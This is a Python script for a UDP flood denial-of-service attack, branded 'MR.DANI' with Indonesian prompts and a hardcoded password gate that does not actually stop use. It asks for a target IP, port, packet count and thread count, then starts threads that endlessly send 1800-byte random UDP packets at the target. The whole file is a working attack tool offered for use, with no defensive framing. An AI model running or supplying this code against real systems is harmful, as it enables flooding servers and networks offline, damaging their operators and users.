import random
import socket
import threading
import time
import os
import sys

os.system("clear")
#login tools
password ="DANI"

for i in range(3):
	pwd = input("[•] password : ")
	j=3
	if(pwd==password):
		time.sleep(5)
		print("[•] Please Wait!!! ")
		break
	else:
		time.sleep(5)
		print("[×] Wrong Password!!! ")
		continue
time.sleep(5)
print("[+] Done Use Account \u001b[33mMR.DANI")
time.sleep(5)

print(" Lu Jangan Abuse Ya anjing !!!")
print("""
\u001b[31m
███╗░░░███╗██████╗░░░░██████╗░░█████╗░███╗░░██╗██╗
████╗░████║██╔══██╗░░░██╔══██╗██╔══██╗████╗░██║██║
██╔████╔██║██████╔╝░░░██║░░██║███████║██╔██╗██║██║
██║╚██╔╝██║██╔══██╗░░░██║░░██║██╔══██║██║╚████║██║
██║░╚═╝░██║██║░░██║██╗██████╔╝██║░░██║██║░╚███║██║
╚═╝░░░░░╚═╝╚═╝░░╚═╝╚═╝╚═════╝░╚═╝░░╚═╝╚═╝░░╚══╝╚═╝
""")

ip = str(input("   \u001b[31m[M] \u001b[37m@MR.DANI >>>>> Ip/Host :\u001b[31m  "))
time.sleep(3)
print(" ")
port = int(input("   \u001b[31m[R] \u001b[37m@MR.DANI >>>>> Port Server :\u001b[31m  "))
print(" ")
times = int(input("   \u001b[31m[D] \u001b[37m@MR.DANI >>>>> Paket yang akan kamu kirim :\u001b[31m  "))
print(" ")
threads = int(input("   \u001b[31m[N] \u001b[37m@MR.DANI >>>>> Isi paket :\u001b[31m  "))
time.sleep(3)

# Attack
def wt():
	data = random._urandom(1800)
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(f"\u001b[33m [%] @MR.DANI >>>>> \u001b[31mAttack Ke Ip \u001b[37m{ip} \u001b[31mDan Port \u001b[37m{port}")
		except:
			print(f"\u001b[33m [&] @MR.DANI >>>>> \u001b[31mAttack Ke Ip \u001b[37m{ip} \u001b[31mDan Port \u001b[37m{port}")

# Threads
for y in range(threads):
	th = threading.Thread(target = wt)
	th.start()
